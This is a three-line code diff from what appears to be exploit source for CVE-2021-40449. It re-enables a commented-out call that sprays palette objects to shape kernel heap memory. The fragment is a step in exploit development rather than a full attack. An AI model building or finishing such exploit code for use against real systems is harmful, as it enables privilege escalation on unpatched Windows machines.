@@ -73,7 +73,7 @@ namespace CVE_2021_40449
 
             puts("[*] Spraying palettes");
 
-            // SprayPalettes(0xe20);
+            SprayPalettes(0xe20);
 
             puts("[*] Done spraying palettes");
         }
